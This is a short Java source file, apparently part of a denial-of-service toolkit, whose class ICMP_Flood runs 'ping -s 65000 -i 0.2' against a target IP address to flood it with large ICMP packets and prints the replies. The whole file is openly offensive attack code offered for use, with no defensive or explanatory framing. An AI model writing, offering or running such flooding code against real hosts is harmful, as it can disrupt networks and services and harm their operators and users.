package Dos;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

/**
 * Created by kenzi on 11/2/16.
 */
public class ICMP_Flood {

    public static void attack(){

        String pingCmd = "ping -s 65000 -i 0.2 ";
        System.out.println(pingCmd);

        try {
            Runtime r = Runtime.getRuntime();
            Process p = r.exec(pingCmd + IpAddress.targetIp);

            BufferedReader in = new BufferedReader(new
                    InputStreamReader(p.getInputStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                System.out.println(inputLine);
            }
            in.close();


        } catch (IOException e) {
            System.out.println(e);
        }


    }
}